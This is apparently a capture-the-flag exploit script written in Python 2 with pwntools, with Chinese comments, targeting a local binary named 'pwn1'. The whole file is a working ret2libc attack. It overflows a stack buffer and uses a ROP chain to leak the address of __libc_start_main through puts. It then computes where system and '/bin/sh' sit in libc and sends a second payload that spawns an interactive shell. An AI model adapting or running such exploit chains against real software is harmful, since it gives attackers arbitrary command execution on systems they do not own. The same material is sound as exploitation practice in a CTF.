# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
		

sh = process('./pwn1')
elf = ELF('./pwn1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi_ret = 0x0000000000401213

padding = 'a' * 40	#这里的溢出利用的就是哥一开始说的那个

payload  = padding
payload += p64(pop_rdi_ret)
payload += p64(elf.got['__libc_start_main'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

#rubbish + rdi(hold __libc_start_main.got_addr) + puts(call puts to puts rdi(__libc_start_main_addr)) + main(return_addr)

sh.recvuntil('choice:\n')
sh.sendline('1')
sh.recvuntil('name\n')
sh.sendline('name')
sh.recvuntil('keyword?\n') # 溢出点
sh.sendline(payload)	#造成溢出
sh.recvuntil('fail\n')	#泄漏处 这之后将泄露__libc_start_main地址(根据debug看出 也就是我上一条消息)
__libc_start_main_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00')) #注意64位要补全为8字节
print "__libc_start_main leak memory ==> " + hex(__libc_start_main_addr)
off_addr = __libc_start_main_addr - libc.symbols['__libc_start_main']
sys_addr = off_addr + libc.symbols['system']
print "sys_addr ==> " + hex(sys_addr)
binsh_addr = off_addr + libc.search('/bin/sh').next()
print "binsh_addr ==> " + hex(binsh_addr)
sh.recvuntil(':\n')
sh.sendline('1')
sh.recvuntil('name\n')
sh.sendline('name')
sh.recvuntil('keyword?\n')

payload  = padding
payload += p64(pop_rdi_ret)#为call system 传递参数
payload += p64(binsh_addr)
payload += p64(sys_addr)
sh.sendline(payload)
sh.interactive()